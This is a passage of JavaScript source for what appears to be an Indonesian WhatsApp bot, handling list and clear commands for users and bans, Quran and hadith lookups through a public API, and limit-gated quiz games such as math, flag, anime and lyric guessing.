fs.unlinkSync(`./ACTION/PLICE/AUDIO/${q}.mp3`)
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break
case 'listerror': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/listerror.json')).length}\n\n`
for (let i of JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/listerror.json'))){          
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
} 
errornye += fake
setReply(errornye)
}
break
case 'liststik':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
setReply(teks)
}
break
case 'listvn':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${audionye.length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
setReply(teks)
}
break
case 'listowner':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks = '┌──⭓「 *List Owner* 」\n│\n'
for (let awokwkwk of Own) {
teks += `│⭔ https://wa.me/${awokwkwk.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${Own.length}*`
setReply(teks)
}
break
case 'listprem':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let teks = '┌──⭓「 *List Premium* 」\n│\n'
for (let awokwkwk of Premium) {
teks += `│⭔ https://wa.me/${awokwkwk.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${Premium.length}*`
setReply(teks)
}
break
case 'listban':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/banned.json')).length}\n\n`
JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/banned.json')).map(function(e, i){
banya += (i+1)+`📲 Nomer : wa.me/${e.id.split("@")[0]}\n    📅 Tanggal : ${e.date}\n\n`            
});
setReply(banya)
break
case 'listblockcmd':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break  
case 'clearallerror':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
setReply("Suksek clear all error")
clearAllError(listerror)
break 
case 'clearallban':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
setReply("Suksek clear all ban")
clearAllBan(ban)
break 
case 'clearallblock':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let obj = [] 
fs.writeFileSync('./ACTION/STORAGE/X-DATA/userblocked.json', JSON.stringify(obj))         
await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
}
break 
case 'clearallUser':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
setReply("Suksek clear all User")
clearAllUser(user)
break
case 'clearallowner':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
clearAllOwner(Own) 
setReply(`BERHASIL MENGHAPUS SEMUA OWNER DI DATABASE`)
break  	
case 'clearallprem':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
clearAllPremium(Premium) 
setReply(`BERHASIL MENGHAPUS SEMUA USER PREMIUM`)
break  	
//━━━━━━━━━━━━━━━[ ISLAMIC ]━━━━━━━━━━━━━━━━━//
case 'hadis': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!args[0]) return setReply( `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (!args[1]) return setReply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
setReply(`No. ${number}

${arab}

${id}`)
} catch (e) {
setReply(`Hadis tidak ditemukan !`)
}
}
break
case 'alquran': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
xdev.sendMessage(from, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : setQuoted })
}
break
case 'tafsirsurah': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break
//━━━━━━━━━━━━━━━[ GAME ]━━━━━━━━━━━━━━━━━//
case 'math': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}

let operators = {
  '+': '+',
  '-': '-',
  '*': '×',
  '/': '÷'
}

function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
if (op == '/') [a, result] = [result, a]
return {
str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result
}
}
function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}
if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let id = from
if (id in xdev.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
xdev.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: ${math2.bonus} XP`),
math2, 4,
setTimeout(async () => {
//if (xdev.math[id]) await xdev.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
if (xdev.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete xdev.math[id]
}, math2.time)
]
}
break
case 'tebakkabupaten':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebakkabupaten.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkabupaten
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.title
let gambar = data.url
let teks = `*TEBAK KABUPATEN*\n\nApa nama kabupaten dari lambang tersebut!\nWaktu : ${gamewaktu}s`
_tebakkabupaten[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkabupaten.json", JSON.stringify(_tebakkabupaten))
xdev.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakkabupaten[sender.split('@')[0]].time)
if (_tebakkabupaten.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakanime[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkabupaten.json", JSON.stringify(_tebakkabupaten)) 
}
}
break
case 'tebakanime':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebakanime.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung") 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakanime
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let gambar = data.image
let japan = data.name_jp
let teks = `*TEBAK ANIME*\n\nSiapa nama Karakter pada gambar tersebut!\n${japan}\nWaktu : ${gamewaktu}s`
_tebakanime[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakanime.json", JSON.stringify(_tebakanime))
xdev.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakanime[sender.split('@')[0]].time)
if (_tebakanime.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakanime[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakanime.json", JSON.stringify(_tebakanime))
}
}
break
case 'tebakbendera':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebakbendera.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakbendera
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.name
let gambar = data.img
let teks = `*TEBAK BENDERA*\n\nApa nama bendera pada gambar tersebut!\nWaktu : ${gamewaktu}s`
_tebakbendera[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakbendera.json", JSON.stringify(_tebakbendera))
xdev.sendMessage(from, { image: { url: gambar }, caption: teks }, { quoted: setQuoted })
await sleep(_tebakbendera[sender.split('@')[0]].time)
if (_tebakbendera.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakbendera[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakbendera.json", JSON.stringify(_tebakbendera))
}
}
break
case 'caklontong':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_caklontong.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = caklontong
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let desk = data.deskripsi
let teks = `𝗖𝗔𝗞 𝗟𝗢𝗡𝗧𝗢𝗡𝗚\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_caklontong[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/caklontong.json", JSON.stringify(_caklontong))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_caklontong[sender.split('@')[0]].time)
if (_caklontong.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: `${jawaban}\n\n${desk}`, mentions: [sender] },
{ quoted : setQuoted }) 
delete _caklontong[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/caklontong.json", JSON.stringify(_caklontong))
}
}
break
case 'tebaklagu':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebaklagu.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")  
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta =  tebaklagu
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.title
let soal = data.artists
let songs = data.songs
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗟𝗔𝗚𝗨\n_Apa Nama Judulnya_\n*Artist:* ${soal}\n\nWaktu : ${gamewaktu}s`
_tebaklagu[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebaklagu.json", JSON.stringify(_tebaklagu))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await xdev.sendMessage(from, { audio: {url : songs }, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
await sleep(_tebaklagu[sender.split('@')[0]].time)
if (_tebaklagu.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebaklagu[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebaklagu.json", JSON.stringify(_tebaklagu))
}
}
break
case 'tebaklirik':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebaklirik.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta =  tebaklirik
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗟𝗜𝗥𝗜𝗞\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_tebaklirik[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebaklirik.json", JSON.stringify(_tebaklirik))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tebaklirik[sender.split('@')[0]].time)
if (_tebaklirik.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebaklirik[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebaklirik.json", JSON.stringify(_tebaklirik))
}
}
break
case 'tekateki':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tekateki.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tekateki
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗧𝗘𝗞𝗔 𝗧𝗘𝗞𝗜;\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s`
_tekateki[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tekateki.json", JSON.stringify(_tekateki))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tekateki[sender.split('@')[0]].time)
if (_tekateki.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tekateki[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tekateki.json", JSON.stringify(_tekateki)) 
}
}
break
case 'tebakkalimat':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tebakkalimat.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkalimat
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let hint = data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗞𝗔𝗟𝗜𝗠𝗔𝗧;\n\n*Soal :* ${soal}\n\nWaktu : ${gamewaktu}s\nHint : ${hint}`
_tebakkalimat[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkalimat.json", JSON.stringify(_tebakkalimat))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tebakkalimat[sender.split('@')[0]].time)
if (_tebakkalimat.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tebakkalimat[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkalimat.json", JSON.stringify(_tebakkalimat))
}
}
break
case 'susunkata':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_susunkata.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = susunkata
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let tipe = data.tipe
let teks = `𝗦𝗨𝗦𝗨𝗡 𝗞𝗔𝗧𝗔;\n\n*Soal :* ${soal}\n*Tipe :* ${tipe}\n\nWaktu : ${gamewaktu}s`
_susunkata[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/susunkata.json", JSON.stringify(_susunkata))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_susunkata[sender.split('@')[0]].time)
if (_susunkata.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _susunkata[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/susunkata.json", JSON.stringify(_susunkata))
}
}
break
case 'asahotak':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_asahotak.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = asahotak
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.jawaban
let soal = data.soal
let teks = `𝗔𝗦𝗔𝗛 𝗢𝗧𝗔𝗞\n\n*Soal :* ${soal}adalah\n\nWaktu : ${gamewaktu}s`
_asahotak[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/asahotak.json", JSON.stringify(_asahotak))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_asahotak[sender.split('@')[0]].time)
if (_asahotak.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _asahotak[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/asahotak.json", JSON.stringify(_asahotak))
}
}
break
case 'tebakkimia':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (_tbkkimia.hasOwnProperty(sender.split('@')[0])) return setReply("Masih ada permainan yang sedang berlangsung")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let datta = tebakkimia
let jsonData = JSON.parse(datta);
let xm = Math.floor(Math.random() * jsonData.length);
let data = jsonData[xm];
console.log(data)//hasil di tampilkan di cmd
let jawaban = data.lambang
let unsur = data.unsur
let teks = `𝗧𝗘𝗕𝗔𝗞 𝗞𝗜𝗠𝗜𝗔\n\nLambang unsur dari ${unsur} adalah\nWaktu : ${gamewaktu}s`
_tbkkimia[sender.split('@')[0]] = { user: sender, jawaban: jawaban.toLowerCase(), time: waktu }  
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkimia.json", JSON.stringify(_tbkkimia))
xdev.sendMessage(from, { text : teks}, { quoted: setQuoted })
await sleep(_tbkkimia[sender.split('@')[0]].time)
if (_tbkkimia.hasOwnProperty(sender.split('@')[0])) {
xdev.sendMessage(from, { text: jawaban, mentions: [sender] },
{ quoted : setQuoted }) 
delete _tbkkimia[sender.split('@')[0]]
fs.writeFileSync("./ACTION/STORAGE/X-DATA/GAME/tebakkimia.json", JSON.stringify(_tbkkimia)) 
}
}
